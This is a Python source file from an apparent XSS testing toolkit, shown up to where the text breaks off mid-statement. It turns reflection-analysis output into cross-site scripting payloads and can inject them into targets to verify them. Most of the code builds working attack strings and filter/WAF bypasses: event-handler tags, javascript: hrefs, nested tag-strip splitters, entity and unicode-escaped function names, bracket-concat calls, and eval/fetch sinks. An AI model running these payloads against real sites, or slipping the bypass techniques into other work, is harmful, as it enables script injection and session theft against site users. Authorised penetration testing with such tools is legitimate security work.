#!/usr/bin/env python3
"""
recommend_payload.py — deterministic payload recommendation.

Reads the latest *-xss_reflection_analysis.json produced by check_reflection.py
and turns it into concrete XSS payload candidates using:

  1. BREAKER computation (XSStrike htmlParser model): for each reflection
     context, derive the minimal string needed to break out of it
     (e.g. attribute -> quote + ">", JS string -> "</script>").
  2. Character efficiency gating (XSStrike checker model): every candidate
     payload is only emitted if all special characters it requires survived
     the filter (score 100 = unchanged, 50 = present but transformed, 0 = gone).
  3. Composition grammar (XSStrike genGen model): payloads are assembled from
     tag x event-handler x function x terminator primitives instead of a
     static list, so filter combinations outside the case library are covered.
  4. Marker-based DOM verification (DalFox R/V model): with --verify, the top
     payloads are actually injected with a unique marker attribute and the
     response is parsed as HTML. The payload is graded V (marker lands in an
     executable position) or R (reflected but not executable).

The curated case/ library remains the reference: each generated payload is
annotated with the case file it corresponds to (confidence 10 knowledge).
"""
import argparse
import json
import os
import re
import secrets
import string
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from html.parser import HTMLParser
from urllib.parse import quote

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
_VERIFY_SESSION = None


def _get_verify_session():
    global _VERIFY_SESSION
    if _VERIFY_SESSION is None and requests is not None:
        s = requests.Session()
        s.headers.update({"User-Agent": _UA})
        _VERIFY_SESSION = s
    return _VERIFY_SESSION

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from log_utils import latest_log_path, new_log_path

PLACEHOLDER = "{xss_testing}"

# --- grammar primitives (XSStrike genGen model) ------------------------------

TAG_HANDLERS = [
    ("img", "onerror", "src=x", ("img_tag", "onerror", "pair_img_onerror")),
    ("svg", "onload", "", ("svg_tag", "onload", "pair_svg_onload")),
    ("details", "ontoggle", "open", ("details_tag", "ontoggle", "pair_details_ontoggle")),
    ("body", "onload", "", ("body_tag", "onload", "pair_body_onload")),
    ("iframe", "onload", "", ("iframe_tag", "onload", "pair_iframe_onload")),
]

# Nested tag-strip bypass (case "xss tag removed.md") is handled by the
# generic `splitters` machinery inside compose() below: every keyword
# item that came back deleted becomes a splitter, and any blocked
# tag/handler/function atom is rebuilt by wrapping the splitter inside it
# (<im<img>g>, on<scr>error, ...). rand_tag (<kmi> junk tag) is tried
# first -- a generic tag-stripper can split ANYTHING.

CONSUMING_TAGS = ["noscript", "style", "title", "textarea", "iframe", "script"]

# '>'-terminated handler composites: a WAF may pass the bare 'svg onload'
# pair yet sign 'onload=<call>()' — the random-identifier probes give
# per-event composite evidence. Handlers not listed have no matching
# probe and keep their pair_* gates only.
GEN_EV = {"onload": "gen_handler", "onerror": "gen_h_error"}

# map context string fragments -> internal context key
CONTEXT_MAP = [
    ("attribute event-handler value", "attr_handler"),
    ("attribute srcdoc value", "attr_srcdoc"),
    ("attribute url value", "attr_url"),
    ("attribute value", "attr"),
    ("javascript line comment", "js_lcomment"),
    ("javascript block comment", "js_bcomment"),
    ("javascript template literal", "js_template"),
    ("javascript raw", "js_raw"),
    ("javascript string", "js_string"),
    ("inside noscript", "consuming:noscript"),
    ("inside style", "consuming:style"),
    ("inside title", "consuming:title"),
    ("inside textarea", "consuming:textarea"),
    ("inside iframe", "consuming:iframe"),
    ("inside script", "consuming:script"),
    ("html comment", "comment"),
    ("html body", "html"),
]

# curated case-library references (kept as confidence-10 knowledge source)
CASE_REF = {
    "breakout_tag": "xss inside an attribute value inside a tag without angle brackets encoded.md",
    "attr_inject": "xss inside an attribute value inside a tag.md",
    "js_breakout": "xss into javascript string without angle brackets encoded.md",
    "js_string_exec": "xss into javascript string with angle brackets encoded.md",
    "tag_breakout": "xss inside a tag.md",
    "body_direct": "xss without encoding and filtering.md",
    "gt_missing": "xss without greater than.md",
    "comment_break": "xss with consuming tags.md",
    "protocol": "xss with javascript protocol.md",
}


# --- helpers -----------------------------------------------------------------

def char_scores(results, refl_idx):
    """Per-character efficiency: 100 unchanged, 50 transformed-but-present,
    0 removed/encoded away."""
    scores = {}
    for r in results:
        if r["reflection_index"] != refl_idx:
            continue
        exp, got = r["expected"], r["got_back"] or ""
        if r["passed"]:
            scores[exp] = 100
        elif exp in got:
            scores[exp] = 50
        else:
            scores[exp] = 0
    return scores


def escaped_quotes(results, refl_idx):
    """Quote chars that the server backslash-escaped ('"' -> '\\"',
    "'" -> "\\'"). In a JS string context, injecting '\\"' when '\\' is not
    stripped/blocked produces '\\\\"' -> literal backslash + live closing
    quote."""
    esc = set()
    for r in results:
        if r["reflection_index"] != refl_idx:
            continue
        exp, got = r["expected"], r["got_back"] or ""
        if exp in ("'", '"', "`") and got == "\\" + exp:
            esc.add(exp)
    return esc


def usable(ch, scores):
    return scores.get(ch, 0) >= 100


def min_eff(payload, scores):
    """Worst efficiency among the six probe chars the payload actually uses."""
    probe = set("'\"<>/\\")
    used = [c for c in payload if c in probe]
    if not used:
        return 100
    return min(scores[c] for c in used)


def required_ok(payload, scores, allow_chars=None):
    """Gate: only emit payload if every probe char it needs scored 100
    (or is explicitly permitted via allow_chars, e.g. escaped-quote
    breakout in JS string context)."""
    probe = set("'\"<>/\\") - set(allow_chars or ())
    return all(scores[c] == 100 for c in payload if c in probe)


def normalize_contexts(contexts):
    keys = []
    for c in contexts:
        for frag, key in CONTEXT_MAP:
            if frag in c.lower():
                keys.append(key)
                break
    return keys or ["html"]


def detect_quote(source_html, marker_full):
    """Re-parse the saved response: find which quote wraps the reflection
    when it lands inside an attribute value or JS string."""
    if not source_html or not os.path.exists(source_html):
        return '"'
    body = open(source_html, encoding="utf-8", errors="replace").read()
    esc = re.escape(marker_full)
    for q in ('"', "'", "`"):
        if re.search(r'[=(\s]' + re.escape(q) + r'[^' + re.escape(q) + r']*' + esc,
                     body, re.DOTALL):
            return q
    # unquoted attribute: =MARKER or =...MARKER
    if re.search(r'=[^\s"\'>]*' + esc, body):
        return ""
    return '"'


def breakers(ctx, quote):
    """Minimal string needed to escape the context (XSStrike 'breaker')."""
    if ctx == "html":
        return [""]
    if ctx == "attr":
        if quote == "":
            return [">", " autofocus onfocus="]
        return [quote + ">", f"{quote} autofocus onfocus={quote}"]
    if ctx == "js_string":
        return ["</script>", quote + "-"]
    if ctx in ("attr_handler", "attr_url", "attr_srcdoc", "js_raw", "js_template"):
        return [""]
    if ctx == "js_lcomment":
        return ["\n"]
    if ctx == "js_bcomment":
        return ["*/"]
    if ctx.startswith("consuming:"):
        tag = ctx.split(":", 1)[1]
        return [f"</{tag}>"]
    if ctx == "comment":
        return ["-->"]
    return [""]


def split_str(target, s):
    """Insert a filter-removed string s inside a blocked target at the
    midpoint so the filter's removal merges the halves back into target
    (split_str('<script>', '<xDh>') -> '<scr<xDh>ipt>').
    Case: xss tag removed.md — any deleted string works as a splitter,
    not just the classic <scr<script>ipt> pattern."""
    k = max(1, len(target) // 2)
    return target[:k] + s + target[k:]


def entity_fname(name):
    """Encode ONE random letter of a JS fn name as a decimal char ref
    ('alert' -> 'al&#101;rt'). Valid only inside attribute values — the
    HTML parser decodes &#NNN; before the JS engine compiles the
    handler, so keyword filters never see the literal name."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"&#{ord(name[i])};" + name[i + 1:]


def entity_variants(name, kw):
    """Alternative char-ref spellings for ONE letter: hex, padded
    decimal, capital-X, and no-semicolon forms ('alert' -> 'al&#x65;rt',
    'al&#0000101;rt', 'al&#X65;rt', 'al&#x65rt'). Same decode layer as
    &#NNN; (the HTML parser — attribute values only) but different byte
    patterns, so a filter that signs the canonical spelling misses them.
    hex_ref gates the &#x/padded/X family; nosemi_ref gates the ';'-less
    forms, which are emitted only when the next letter cannot extend
    the reference ('&#x6c'+'e' would merge into one wrong char)."""
    if not (kw.get("hex_ref", True) or kw.get("nosemi_ref", True)):
        return None
    i = secrets.randbelow(len(name))
    cp = ord(name[i])
    nxt = name[i + 1] if i + 1 < len(name) else ""
    forms = []
    if kw.get("hex_ref", True):
        forms += [f"&#x{cp:x};", f"&#{cp:07d};", f"&#X{cp:X};"]
    if kw.get("nosemi_ref", True):
        if not nxt or not nxt.isdigit():
            forms.append(f"&#{cp}")
        if not nxt or not re.match(r"[0-9a-fA-F]", nxt):
            forms.append(f"&#x{cp:x}")
    if not forms:
        return None
    return name[:i] + secrets.choice(forms) + name[i + 1:]


def _throw_ops(kw):
    """Operands for the onerror/throw idiom. 'throw 1' is canonical, but a
    dead ' ' probe means the space is stripped or splits the handler
    attribute — then only space-free operands work: 'throw-1' == 'throw -1',
    also 'throw/1/' (regex literal) and 'throw'x'' (string literal)."""
    if kw.get("space") is False:
        return ("throw-1", "throw/1/")
    return ("throw 1", "throw-1")


def encoded_funcs(kw):
    """Dialog-fn call strings with one letter entity-encoded, emitted
    ONLY for call forms whose plain version is blocked by the keyword
    mask (the name itself, or its call_*/tick_* junction signature).
    char_ref ('&#101;') gates '&...;' survival — if it came back as
    '&amp;#101;' or stripped, char refs never decode and the technique
    is dead on arrival; entity_lt ('&lt;') is the legacy fallback.
    gen_call/gen_tick must pass too — an encoded name cannot rescue a
    dead ()-call or `1`-call shape (filter blocks 'abc()' wholesale)."""
    if not kw.get("char_ref", kw.get("entity_lt", True)):
        return []
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    out = []
    for name in ("alert", "confirm", "prompt", "print"):
        arg = "()" if name == "print" else "(1)"
        enc = entity_fname(name)
        var = entity_variants(name, kw)
        if parens and (not kw.get(name, True)
                       or not kw.get(f"call_{name}", True)):
            out.append(f"{enc}{arg}")
            if var:
                out.append(f"{var}{arg}")
        if btick and (not kw.get(name, True)
                      or not kw.get(f"tick_{name}", True)):
            out.append(f"{enc}`1`")
            if var:
                out.append(f"{var}`1`")
        if not parens and not btick and not kw.get(name, True):
            for op in _throw_ops(kw):
                out.append(f"onerror={enc};{op}")
                if var:
                    out.append(f"onerror={var};{op}")
    return out


def u_fname(name):
    """Encode ONE random letter of a JS fn name as a unicode escape
    ('alert' -> 'al\\u0065rt'). Decoded by the JS engine, not the HTML
    parser — valid wherever the payload lands as JS source: <script>
    bodies, on*="..." values, javascript: URIs, js_* contexts."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"\\u{ord(name[i]):04x}" + name[i + 1:]


def u_funcs(kw):
    """Unicode-escaped call strings for dialog-fns whose plain form is
    blocked (name or its call_*/tick_* junction). Backslash survival is
    enforced by required_ok — '\\' is a char-probe item, so filtered or
    transformed backslashes auto-reject these payloads at the char
    gate; no keyword proxy needed. gen_call/gen_tick apply the control
    layer: a dead generic call shape kills the (1)/`1` forms outright."""
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    out = []
    for name in ("alert", "confirm", "prompt", "print"):
        arg = "()" if name == "print" else "(1)"
        enc = u_fname(name)
        if parens and (not kw.get(name, True)
                       or not kw.get(f"call_{name}", True)):
            out.append(f"{enc}{arg}")
        if btick and (not kw.get(name, True)
                      or not kw.get(f"tick_{name}", True)):
            out.append(f"{enc}`1`")
        if not parens and not btick and not kw.get(name, True):
            for op in _throw_ops(kw):
                out.append(f"onerror={enc};{op}")
    return out


def u6_fname(name):
    """Encode ONE random letter of a JS fn name as an ES6 brace-form
    unicode escape ('alert' -> 'al\\u{65}rt'). Same decode layer as
    \\u0065 (the JS engine — valid in identifiers AND string literals)
    but the \\u{XX} shape is not matched by filters written for the
    fixed 4-digit form, and the digit count inside the braces is
    arbitrary ('\\u{0000000065}' is still 'a')."""
    i = secrets.randbelow(len(name))
    return name[:i] + f"\\u{{{ord(name[i]):x}}}" + name[i + 1:]


def u6_funcs(kw):
    """ES6 \\u{XX} call strings for dialog-fns whose plain form is
    blocked (name or call_*/tick_* junction) — the brace-form sibling
    of u_funcs. gen_u6brace probes whether the '{...}' escape shape
    reaches the page at all: a filter can strip '{' while leaving a
    bare \\u untouched."""
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    brace = kw.get("gen_u6brace", True)
    if not brace:
        return []
    out = []
    for name in ("alert", "confirm", "prompt", "print"):
        arg = "()" if name == "print" else "(1)"
        enc = u6_fname(name)
        if parens and (not kw.get(name, True)
                       or not kw.get(f"call_{name}", True)):
            out.append(f"{enc}{arg}")
        if btick and (not kw.get(name, True)
                      or not kw.get(f"tick_{name}", True)):
            out.append(f"{enc}`1`")
        if not parens and not btick and not kw.get(name, True):
            for op in _throw_ops(kw):
                out.append(f"onerror={enc};{op}")
    return out


def bracket_funcs(kw, forbid_q=None):
    """Global-object string-concat calls: self['a'+'lert'](1) et al.

    Two roles: (a) the vehicle for string-only escapes ('\\x61',
    '\\141', '\\u{61}') which can never appear in an identifier;
    (b) the only name-bypass surviving when BOTH '\\' and '&' are
    filtered — a pure 'a'+'lert' concat needs neither. Emitted ONLY
    for names whose plain call form is blocked (the name itself or its
    call_* junction): when alert(1) works there is nothing to bypass,
    so no candidate is generated (saves verify steps). gen_bracket
    controls the composite self['x'+'y']() shape; gen_call/gen_tick
    still gate the call shapes. forbid_q drops the inner-quote variant
    that would collide with the surrounding context (js_string
    '-...-', attr_handler/url/srcdoc "...\"...")."""
    if not kw.get("gen_bracket", True):
        return []
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    quotes = [q for q in ("'", '"') if q != forbid_q] or ["'"]
    objs = ("self", "window", "globalThis", "top", "frames")
    per_name = []
    for oi, name in enumerate(("alert", "confirm", "prompt", "print")):
        if kw.get(name, True) and \
                kw.get(f"call_{name}", kw.get("gen_call", True)):
            continue
        arg = "()" if name == "print" else "(1)"
        obj = objs[oi % len(objs)]  # rotated alt-object for diversity
        # unsplit/noop-escape/embed-literal forms carry the name verbatim:
        # provably dead when the name atom itself is stripped (kw[name]=F),
        # so they are pruned instead of wasting verify steps on corpses.
        name_ok = kw.get(name, True)
        # every split position: 'a'+'lert' .. 'aler'+'t' — deterministic
        # coverage of anything a random splitter could emit
        splits = [(name[:k], name[k:]) for k in range(1, len(name))]
        cp = ord(name[0])
        exprs = []
        for q in quotes:
            if name_ok:
                exprs.append(f"self[{q}{name}{q}]")
                # single-string escapes: the JS engine decodes these
                # INSIDE the string literal — the request carries
                # neither the fn name nor a concat shape. '\a' is a
                # noop-escape: backslash before a non-escape letter
                # is ignored -> 'a' (NZT-48 invalid-escape vector).
                exprs.append(f"self[{q}\\{name[0]}{name[1:]}{q}]")
            exprs.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]")
            exprs.append(f"self[{q}\\{cp:03o}{name[1:]}{q}]")
            exprs.append(f"self[{q}\\u{{{cp:x}}}{name[1:]}{q}]")
            for fst, rst in splits:
                exprs.append(f"self[{q}{fst}{q}+{q}{rst}{q}]")
        if obj != "self":
            q = quotes[0]
            if name_ok:
                exprs.append(f"{obj}[{q}{name}{q}]")
            exprs.append(f"{obj}[{q}\\x{cp:02x}{name[1:]}{q}]")
            for fst, rst in splits:
                exprs.append(f"{obj}[{q}{fst}{q}+{q}{rst}{q}]")
        q, (fst, rst) = quotes[0], splits[0]
        exprs.append(f"{obj}[{q}\\x{cp:02x}{q}+{q}{rst}{q}]")
        exprs.append(f"{obj}[{q}\\{cp:03o}{q}+{q}{rst}{q}]")
        exprs.append(f"{obj}[{q}\\u{{{cp:x}}}{q}+{q}{rst}{q}]")

        if parens:
            v = [f"{e}{arg}" for e in exprs]
        elif btick:
            v = [f"{e}`1`" for e in exprs]
        else:
            v = [f"onerror={e};{op}" for e in exprs
                 for op in _throw_ops(kw)]
        per_name.append(v)
    # Round-robin across fn names: a growing fn_cap samples every family
    # evenly (each name's simplest forms first) instead of exhausting one
    # family's variants before the next name is ever reached.
    out = []
    for i in range(max((len(v) for v in per_name), default=0)):
        for v in per_name:
            if i < len(v):
                out.append(v[i])
    return out


def junction_ok(item, kw, kwv):
    """Refined junction-probe verdict. The js_break_* probes embed a
    literal fn name ('-alert(1)-): a FAIL can mean the filter stripped
    ONLY the name while the breakout syntax survived. Proof: expected
    minus every blocked fn-name equals got_back — then encoded fn
    names still flow through the junction."""
    if kw.get(item, True):
        return True
    e, g = kwv.get(item, ("", ""))
    if not e:
        return False
    stripped = e
    for n in ("alert", "confirm", "prompt", "print"):
        if not kw.get(n, True):
            stripped = stripped.replace(n, "")
    return stripped == g


def avail_funcs(kw):
    """JS call primitives allowed by the keyword mask (Layer B/C gate).
    Missing keyword analysis -> everything assumed allowed (backward compat).
    gen_call/gen_tick (random-identifier probes) are the control layer:
    when a call_*/tick_* junction probe is absent they decide whether the
    bare call shape itself is viable. A passing call_* probe is direct
    evidence and always wins over the generic control."""
    parens = kw.get("parentheses", True)
    btick = kw.get("backtick", True)
    call_shape = parens and kw.get("gen_call", True)
    tick_shape = btick and kw.get("gen_tick", True)
    funcs = []
    for name in ("alert", "confirm", "prompt", "print"):
        if not kw.get(name, True):
            continue
        arg = "()" if name == "print" else "(1)"
        if parens and kw.get(f"call_{name}", kw.get("gen_call", True)):
            funcs.append(f"{name}{arg}")
        if btick and kw.get(f"tick_{name}", kw.get("gen_tick", True)):
            funcs.append(f"{name}`1`")
        if not call_shape and not tick_shape:
            for op in _throw_ops(kw):
                funcs.append(f"onerror={name};{op}")
    return funcs


# DOM sinks that insert markup via innerHTML-style APIs: a <script> element
# created this way is inert per the HTML spec — it never executes, so script
# payloads must not be emitted for these sinks (event-handler tags do fire).
INERT_SCRIPT_SINKS = ("innerhtml", "outerhtml", "insertadjacenthtml",
                      "createcontextualfragment")


def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2,
            escaped_q=None, js_breakout="", deny=False):
    """Assemble candidate payloads from grammar primitives.
    kw: keyword mask {name: bool} from the probe2 analysis (Layer B/C gate).
    kwv: {name: (expected, got_back)} — the actual probed strings, needed to
    build nested splitters from whatever string the filter deleted.
    inert: sink inserts markup without running scripts (innerHTML-family).
    escaped_q: set of quote chars backslash-escaped by the filter ('\"').
    js_breakout: structural closer sequence (e.g. '"]})') computed from the
    enclosing <script> prefix up to the reflection point.
    Returns list of dicts: {payload, technique, case_ref, efficiency}."""
    kw = kw or {}
    kwv = kwv or {}
    escaped_q = escaped_q or set()
    funcs = avail_funcs(kw)
    # Contexts where a fn lands INSIDE a live quote — a bracket-concat
    # using the same quote char would terminate it early ('-...-' in a
    # '...' JS string, on*="..." handler/url/srcdoc values). Bracket
    # fns there must build their strings with the OTHER quote.
    INNER_Q_CTXS = ("attr_handler", "attr_url", "attr_srcdoc",
                    "js_string")
    forbid_q = quote if (ctx in INNER_Q_CTXS
                         and quote in ("'", '"')) else None
    # hfuncs — event-handler attribute values (on*="..."): both HTML
    # char refs (&#NNN;) and JS unicode escapes (NNNN) decode there.
    # Inside inline HTML event handlers (onfocus=, onload=, onerror=, ...),
    # the browser wraps the handler body in `with(document){with(this){...}}`.
    # Because every HTMLElement/SVGElement defines `this.onerror`, a bare
    # `onerror=alert;throw 1` assigns to the element's own onerror property
    # instead of `window.onerror`, so `throw 1` never invokes the dialog!
    # Qualifying as `self.onerror=...;throw 1` escapes `with(this)` shadowing.
    # jfuncs — JS-source positions (<script> bodies, js_* contexts,
    # javascript: URIs): only \u escapes decode; &#NNN; stays literal.
    # Both lists are pre-filtered through required_ok: an fn needing a
    # probe char that scored <100 can never survive add()'s gate anyway,
    # and leaving it in place would waste hfuncs[:fn_cap]/[0] slots on dead
    # variants (e.g. aler\u0074(1) when '\' is escaped -> '\\').
    # Strings the filter deleted outright (item FAILed AND its reflection
    # came back empty). Used both to split blocked tags in HTML context and,
    # when every standard/encoded/unicode/bracket fn primitive is dead, to
    # reconstruct dialog fn names in ANY context (e.g. 'alconfirmert' ->
    # filter strips 'confirm' -> 'alert').
    splitters = sorted(
        ((n, e) for n, (e, g) in kwv.items()
         if not kw.get(n, True) and e and g == ""),
        key=lambda p: (p[0] != "rand_tag", "<" not in p[1], p[0]))
    rsplit = [s for _, s in splitters]

    def _rebuild_name(name, s):
        """Call forms for one dialog name split by splitter s. s == name is
        kept: str_replace removes the embedded occurrence in a single pass
        and the merged residue ('al'+'alert'+'ert' -> 'alert') survives."""
        parens = kw.get("parentheses", True) and kw.get("gen_call", True)
        btick = kw.get("backtick", True) and kw.get("gen_tick", True)
        arg = "()" if name == "print" else "(1)"
        sp = split_str(name, s)
        if parens:
            return [f"{sp}{arg}"]
        if btick:
            return [f"{sp}`1`"]
        return [f"onerror={sp};{op}" for op in _throw_ops(kw)]

    def rebuild_fn(s):
        """funcs is empty -> every call primitive is blocked.
        Rebuild dialog fns via splitter s + the call syntax that
        survived; the mid-name split also breaks call_*/tick_*
        junction signatures (request never contains 'alert(1)')."""
        return [f for name in ("alert", "confirm", "prompt", "print")
                for f in _rebuild_name(name, s)]

    def sink_fns():
        """Last-resort sinks for kill-lists that ban every dialog name AND
        every call syntax: functions reachable through unblocked names —
        eval/setTimeout/Function (string-eval sinks), fetch (request
        primitive), open (popup). 'open' is ordered last: inside an inline
        handler 'with(document)' scope binds it to document.open, which
        dies on 'this' when invoked by window.onerror — no observable
        effect; eval/setTimeout/Function have no document.* shadow and
        provably receive the thrown error string."""
        return [f"onerror={n};{op}"
                for n in ("eval", "setTimeout", "Function", "fetch", "open")
                for op in _throw_ops(kw)]

    def rebuild_all():
        """Name-major rebuild order: 'alert' tried against every splitter
        before 'confirm' — the first name usually sits earliest in the
        blacklist, so its merged residue most often survives."""
        return [f for name in ("alert", "confirm", "prompt", "print")
                for s in rsplit if required_ok(s, scores)
                for f in _rebuild_name(name, s) if required_ok(f, scores)]

    raw_hfuncs = [f for f in (funcs + encoded_funcs(kw) + u_funcs(kw)
                              + u6_funcs(kw) + bracket_funcs(kw, forbid_q))
                  if required_ok(f, scores)]
    raw_jfuncs = [f for f in (funcs + u_funcs(kw) + u6_funcs(kw)
                              + bracket_funcs(kw, forbid_q))
                  if required_ok(f, scores)]
    if not raw_hfuncs:
        # deny pages (rid==0) kill any request CONTAINING a blocked string,
        # so splitter-embedded names are corpses — go straight to sinks.
        raw_hfuncs = ([] if deny else rebuild_all()) + \
            [f for f in sink_fns() if required_ok(f, scores)]
    if not raw_jfuncs:
        raw_jfuncs = ([] if deny else rebuild_all()) + \
            [f for f in sink_fns() if required_ok(f, scores)]
    hfuncs = [(f"self.{f}" if f.startswith("onerror=") else f)
              for f in raw_hfuncs]
    jfuncs = list(raw_jfuncs)
    out = []
    marker = "vvm{id}"

    def add(payload, technique, case_ref, allow_chars=None):
        if required_ok(payload, scores, allow_chars=allow_chars):
            if "&#" in payload:
                technique += " (entity-encoded fn)"
            if "\\u" in payload:
                technique += " (unicode-escaped fn)"
            if "['" in payload or '["' in payload:
                technique += " (bracket-access fn)"
            out.append({
                "payload": payload,
                "technique": technique,
                "case_ref": case_ref,
                "efficiency": min_eff(payload, scores),
            })

    def shape_ok(gen_key, fn):
        """Composite-probe gate: applies only when fn uses the ()-call
        shape the probe carries ('abc()'). Backtick/throw forms have a
        different signature — their gate already ran in the fn builders."""
        return "(" not in fn or gen_key is None or kw.get(gen_key, True)

    def attr_val(fn):
        """Quote a handler value when it contains spaces ('onerror=...;throw 1')
        so HTML tokenization does not split the attribute at 'throw 1'."""
        if " " not in fn:
            return fn
        for q in ('"', "'"):
            if q not in fn and usable(q, scores):
                return f"{q}{fn}{q}"
        return fn

    tags_ok = usable("<", scores) and usable(">", scores)
    slash_ok = usable("/", scores)
    space_ok = (kw.get("space") is not False) or bool(kw.get("pair_img_onerror"))
    q_ok = quote == "" or usable(quote, scores)
    script_ok = kw.get("script_tag", True)

    def handler_variants():
        """(tag, ev, extra) entries allowed by the keyword mask."""
        return [(t, e, x) for t, e, x, deps in TAG_HANDLERS
                if all(kw.get(d, True) for d in deps)]

    if ctx == "html":
        if tags_ok:
            def fix(key, word, s):
                """Split word with removed string s when its kw key was
                blocked; leave it unchanged when it passed."""
                return word if kw.get(key, True) else split_str(word, s)

            if not inert:
                if script_ok:
                    for fn in jfuncs or (rebuild_fn(rsplit[0]) if rsplit else []):
                        if shape_ok("gen_script", fn):
                            add(f"<script {marker}>{fn}</script>",
                                "script injection", "body_direct")
                else:
                    if kw.get("case_script", True):
                        for fn in jfuncs[:fn_cap] or (rebuild_fn(rsplit[0]) if rsplit else []):
                            add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
                                "case-mutated script tag", "tag_removed")
                    for s in rsplit[:3]:
                        for fn in jfuncs[:fn_cap] or rebuild_fn(s):
                            # marker must sit inside a /* */ comment here:
                            # the split tag already closed, so a bare
                            # marker>fn becomes `ident > fn` -> dead code.
                            add(f"{split_str('<script>', s)}{fn}/*{marker}*/"
                                f"{split_str('</script>', s)}",
                                f"nested tag-strip bypass ({s} splitter)", "tag_removed")
            for tag, ev, extra, deps in TAG_HANDLERS:
                if all(kw.get(d, True) for d in deps) and space_ok:
                    for fn in hfuncs[:fn_cap]:
                        if shape_ok(GEN_EV.get(ev), fn):
                            add(f"<{tag} {extra} {marker} {ev}={attr_val(fn)}>"
                                .replace("  ", " "),
                                f"{tag} {ev} handler", "body_direct")
                elif not space_ok and slash_ok and \
                        kw.get(f"{tag}_tag", True) and kw.get(ev, True):
                    # Space stripped/blocked: use '/' as HTML5 attribute
                    # separator inside the tag (<svg/vvm.../onload=fn>).
                    # Note: 'src=x' must become boolean 'src' because in HTML5
                    # an unquoted attribute value ('src=x/...') swallows '/'.
                    s_extra = "src" if extra == "src=x" else extra
                    for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                        parts = [f"<{tag}", s_extra, marker, f"{ev}={fn}>"]
                        add("/".join(p for p in parts if p),
                            f"slash-separated {tag} {ev} handler (space bypass)",
                            "body_direct")
                else:
                    # Rebuild blocked atoms by nesting a removed string.
                    # When ONLY the pair_* junction failed (e.g. the WAF
                    # signs 'img onerror' while every atom passes), the tag
                    # atom is split unconditionally — otherwise the emitted
                    # payload still carries the contiguous signature and is
                    # dead on arrival. Atom-blocked cases split only the
                    # blocked atoms, keeping splitter occurrences minimal.
                    for s in rsplit[:2]:
                        atom_blocked = any(
                            not kw.get(d, True)
                            for d in deps if not d.startswith("pair_"))
                        tag_atom = fix(tag + "_tag", "<" + tag, s) \
                            if atom_blocked else split_str("<" + tag, s)
                        for fn0 in hfuncs[:fn_cap] or [
                                (f"self.{r}" if r.startswith("onerror=") else r)
                                for r in rebuild_fn(s)]:
                            if ";" in fn0 or "=" in fn0:
                                add(f"{tag_atom} {extra} {marker} "
                                    f"{fix(ev, ev, s)}={attr_val(fn0)}>"
                                    .replace("  ", " "),
                                    f"removed-string splitter ({s})", "tag_removed")
                                continue
                            fname = re.split(r"[(`]", fn0)[0]
                            add(f"{tag_atom} {extra} {marker} "
                                f"{fix(ev, ev, s)}="
                                f"{fix(fname, fname, s)}{fn0[len(fname):]}>"
                                .replace("  ", " "),
                                f"removed-string splitter ({s})", "tag_removed")
            if kw.get("javascript_proto", True) and \
                    kw.get("proto_href", True):
                for fn in jfuncs[:fn_cap]:
                    if shape_ok("gen_jsurl", fn):
                        add(f'<a {marker} href="javascript:{fn}">XSS</a>',
                            "javascript: protocol href", "protocol")
            if not kw.get("javascript_proto", True) and kw.get("case_proto", True):
                for fn in jfuncs[:fn_cap]:
                    add(f'<a {marker} href="JaVaScRiPt:{fn}">XSS</a>',
                        "case-mutated javascript: href", "protocol")
            jfns = jfuncs[:fn_cap] or (rebuild_fn(rsplit[0]) if rsplit else [])
            if not kw.get("javascript_proto", True) and rsplit and jfns:
                for jfn in jfns:
                    add(f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
                        f'{jfn}">XSS</a>',
                        f"removed-string splitter ({rsplit[0]})", "tag_removed")
            if kw.get("svg_tag", True) and not kw.get("onload", True) \
                    and kw.get("case_onload", True):
                for fn in hfuncs[:fn_cap]:
                    add(f"<svg {marker} OnLoAd={attr_val(fn)}>",
                        "case-mutated onload handler", "body_direct")
            # last-resort: entity-encoded inner HTML inside iframe srcdoc.
            # Reaches the case "keywords/()/script blocked but entities pass".
            # The inner fn name also gets \u-escaped when 'alert' itself is
            # blocked — after the entity decode the JS engine resolves it.
            if kw.get("entity_lt", True) and kw.get("srcdoc", True) and \
                    kw.get("iframe_tag", True) and \
                    (not kw.get("parentheses", True) or not script_ok
                     or not kw.get("alert", True)):
                src_fn = "alert" if kw.get("alert", True) else u_fname("alert")
                add(f'<iframe {marker} srcdoc=&lt;script&gt;{src_fn}&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',
                    "iframe srcdoc entity-encoded", "special_attrs")
        elif usable("<", scores) and not usable(">", scores) and hfuncs:
            # "no greater-than" (case: xss without greater than.md): the
            # tag stays unterminated and the page's OWN next '>' closes
            # it. A '<tag>' keyword can only fail HERE because its '>'
            # vanished -- gating on it makes this branch unreachable, so
            # instead check the bare NAME survived via kwv got_back:
            # '<svg>' -> '<svg' means only the '>' was stripped.
            def name_ok(key):
                if kw.get(key, True):
                    return True
                e, g = kwv.get(key, ("", ""))
                return bool(e) and g == e.replace(">", "")
            slash_handlers = sorted(
                TAG_HANDLERS, key=lambda th: (th[0] != "svg", th[2] != ""))
            for tag, ev, extra, deps in (
                    TAG_HANDLERS if space_ok else slash_handlers):
                others = [d for d in deps if d != deps[0]]
                if name_ok(deps[0]) and \
                        all(kw.get(d, True) for d in others) and space_ok:
                    for fn in hfuncs[:fn_cap]:
                        add(f"<{tag} {extra} {marker} {ev}={fn}//"
                            .replace("  ", " "),
